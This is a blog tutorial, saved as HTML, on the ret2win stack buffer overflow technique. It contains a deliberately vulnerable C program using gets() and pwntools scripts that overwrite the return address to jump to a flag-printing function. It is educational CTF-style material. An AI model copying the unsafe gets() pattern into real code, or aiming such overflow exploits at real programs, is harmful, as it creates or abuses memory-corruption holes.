@@ -1,0 +1,96 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>ret2win</title><meta name="description" content="This is Ischyros blog where he posts cyber security topics and sheets"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/ISC.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+
+Binary Exploitation SeriesIntroductionBinary exploitation is a field within computer security that involves finding and exploiting vulnerabilities in binary code, such as executable files or software applications. This practice, often performed by ethical hackers or security researchers, aims to uncover weaknesses that can be leveraged to gain unauthoriz.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Ischyr's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">ret2win</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Binary-Exploitation-Series"><span class="toc-text">Binary Exploitation Series</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Introduction"><span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-the-Padding"><span class="toc-text">Finding the Padding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-the-Information"><span class="toc-text">Using the Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Putting-it-Together"><span class="toc-text">Putting it Together</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Binary%20Exploitation"><i class="tag post-item-tag">Binary Exploitation</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">ret2win</h1><time class="has-text-grey" datetime="2023-05-24T08:49:23.000Z">2023-05-24</time><article class="mt-2 post-content"><img src="/2023/05/24/ret2win/avatar.png" class="">
+
+<h1 id="Binary-Exploitation-Series"><a href="#Binary-Exploitation-Series" class="headerlink" title="Binary Exploitation Series"></a>Binary Exploitation Series</h1><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>Binary exploitation is a field within computer security that involves finding and exploiting vulnerabilities in binary code, such as executable files or software applications. This practice, often performed by ethical hackers or security researchers, aims to uncover weaknesses that can be leveraged to gain unauthorized access, execute arbitrary code, or manipulate the behavior of a program.</p>
+<p>Return-to-Win is a specific technique used in binary exploitation that focuses on exploiting vulnerabilities related to function return addresses. It involves manipulating the execution flow of a program by overwriting the return address of a function with a target address. By doing so, an attacker can redirect the control flow to a desired location, potentially gaining unauthorized access or executing arbitrary code.</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;
+# compile it with: gcc ret2win.c -o ret2win
+
+void winFunction() &#123;
+    char flag[64];
+    FILE* file &#x3D; fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+    if (file &#x3D;&#x3D; NULL) &#123;
+        printf(&quot;Error: Flag file could not be opened.\n&quot;);
+        return;
+    &#125;
+    fgets(flag, sizeof(flag), file);
+    printf(&quot;Flag: %s\n&quot;, flag);
+    fclose(file);
+&#125;
+
+void vulnerableFunction() &#123;
+    char buffer[64];
+    gets(buffer); &#x2F;&#x2F; Unsafe input reading function
+    printf(&quot;You entered: %s\n&quot;, buffer);
+&#125;
+
+int main() &#123;
+    vulnerableFunction();
+    return 0;
+&#125;</code></pre>
+
+<p>For instance, if the attacker wants to redirect the control flow to a function called <code>winFunction</code>, they would need to find the address of <code>winFunction</code> in the program’s memory. Once they have this address, they can construct a payload that overflows the buffer and overwrites the return address with the address of <code>winFunction</code>.</p>
+<p>To do this, first we will need a couple of things:</p>
+<ul>
+<li>the padding until we begin to overwrite the <strong>RIP</strong> ( instruction pointer )</li>
+<li>the value we want to overwrite the <strong>RIP</strong> ( in our case with the <strong>winFunction</strong> )</li>
+</ul>
+<h3 id="Finding-the-Padding"><a href="#Finding-the-Padding" class="headerlink" title="Finding the Padding"></a>Finding the Padding</h3><p>The fastest way to find the padding is by using <strong>gdb-peda</strong> which haves a function called <strong>pattern create</strong> that will generate a string based on a lenght.</p>
+<img src="/2023/05/24/ret2win/11.19.36.png" class="">
+<p>After we have created the cyclic pattern we can type <code>r</code> in order to start the program. When the program asks for the user input just paste the pattern and press <strong>ENTER</strong></p>
+<img src="/2023/05/24/ret2win/11.21.47.png" class="">
+
+<p>We can see that the program crashed at <code>0x000055555555523a</code> in <strong>vulnerableFunction()</strong><br>Using the command <code>pattern search</code> , it will search in the registers for the pattern.</p>
+<h3 id="Using-the-Information"><a href="#Using-the-Information" class="headerlink" title="Using the Information"></a>Using the Information</h3><p>Using this information we can see that in order to overwrite the <strong>RSP</strong> register ( stack pointer ) we need to give it <strong>72</strong> random bytes. Knowing this is a 64 bit arhitecture the offset to the <strong>RIP</strong> should be <strong>RSP+8</strong>.<br>This means that the next 8 bytes after the 72 offset will overwrite the <strong>instruction pointer</strong>.</p>
+<h3 id="Putting-it-Together"><a href="#Putting-it-Together" class="headerlink" title="Putting it Together"></a>Putting it Together</h3><p>In order to test this we will create a script in python using <strong>pwntools</strong> ( <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/install.html">https://docs.pwntools.com/en/stable/install.html</a> )<br>The pwntools library is a powerful and widely used Python library designed for binary exploitation, particularly in the context of Capture The Flag (CTF) competitions and exploit development. It provides a comprehensive set of tools and utilities to assist in various stages of exploit development, including remote communication, payload generation, and exploitation techniques.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+
+p &#x3D; process(&quot;.&#x2F;ret2win&quot;)
+
+def main():
+
+	payload &#x3D; b&quot;&quot;
+	payload +&#x3D; b&quot;A&quot;*72
+	payload +&#x3D; p64(0xdeadbeef)
+
+	pause()
+	p.sendline(payload)
+
+	p.interactive()
+
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+	main()</code></pre>
+
+<p>We will try to overwrite the <strong>RIP</strong> with the value <strong>0xdeadbeef</strong> in order to see if we successfully overwrite it.</p>
+<img src="/2023/05/24/ret2win/11.36.21.png" class="">
+
+<p>As you can see the value of <strong>RIP</strong> has changed to <strong>0xdeadbeef</strong>, that means we have completely control of the instruction pointer.<br>The next part is to find the address of the <strong>winFunction</strong> and change it with the <strong>0xdeadbeef</strong> address.<br>In order to do that we will use <strong>pwntools</strong> to automatically extract the address of the function:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+
+p &#x3D; process(&quot;.&#x2F;ret2win&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;ret2win&quot;, checksec&#x3D;False)
+
+def main():
+
+	win_function &#x3D; elf.symbols[&#39;winFunction&#39;]
+
+	payload &#x3D; b&quot;&quot;
+	payload +&#x3D; b&quot;A&quot;*72
+	payload +&#x3D; p64(win_function)
+
+	pause()
+	p.sendline(payload)
+
+	p.interactive()
+
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+	main()</code></pre>
+
+<p>Or you could use <strong>gdb</strong> and extract the address manually:</p>
+<img src="/2023/05/24/ret2win/11.39.45.png" class="">
+
+<p>In conclusion, the ret2win binary exploitation technique is a powerful tool in the hands of a skilled attacker. By carefully manipulating the stack and exploiting vulnerable functions, an attacker can gain control over the program’s execution flow, ultimately leading to a successful exploitation.</p>
+<p>Thank you for joining me on this journey through the fascinating world of ret2win binary exploitation. Keep exploring, keep learning, and stay vigilant in the fight against cyber threats. Together, we can build a safer and more secure digital future.</p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2022/10/17/malware-analysis/" title="Malware Analysis"><span class="has-text-weight-semibold">Next: Malware Analysis</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201/"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Ischyr</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><div style="margin-top: 2px"></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
